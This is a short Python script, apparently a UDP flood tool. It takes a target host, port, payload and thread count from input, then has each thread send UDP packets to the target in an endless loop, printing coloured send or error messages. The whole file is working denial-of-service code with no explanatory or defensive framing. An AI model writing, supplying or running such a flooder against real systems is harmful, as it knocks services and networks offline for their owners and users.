import socket
from termcolor import colored
from threading import Thread

host = input('host: ')
port = int(input('port: '))
payload = input('payload: ')
threads = int(input('threads: '))

def udp(host,port,payload):
    addr = (host,port)
    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(payload,addr)
        except:
            print(colored('Error connection ' + host,'red'))
        else:
            print(colored('Send to ' + host,'green'))

for i in range(0,threads):
    thr = Thread(target=udp,args=(host,port,payload.encode(),))
    thr.start()
